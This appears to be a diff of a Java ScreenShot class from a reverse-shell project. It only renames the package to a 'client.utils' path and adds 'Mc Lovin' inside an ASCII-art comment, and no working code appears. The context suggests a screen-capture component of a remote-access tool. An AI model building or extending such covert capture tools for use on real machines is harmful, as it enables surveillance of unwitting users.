@@ -1,4 +1,4 @@
-package obs1d1anc1ph3r.reverseshell.utils;
+package obs1d1anc1ph3r.reverseshell.client.utils;
 
 import java.awt.*;
 import java.awt.image.BufferedImage;
@@ -137,5 +137,5 @@ public class ScreenShot {
 ++*****++++***++++++******+++++********++=*#%@@%%%%%%%%@@@@@%*:.  .:::::....                      ..:#@@@@@@%%%%%%@@%+-==++=++++===++++=====-=---=-====
 ++**+++++++++++=+++++******++++*************#%@%%%%%%%%%%%%%@@@@@%*==.  ...                      .:#@@@@@@%%%%%%%%@%=-:=====++++++===++++++++======---=
 
-
+Mc Lovin
  */
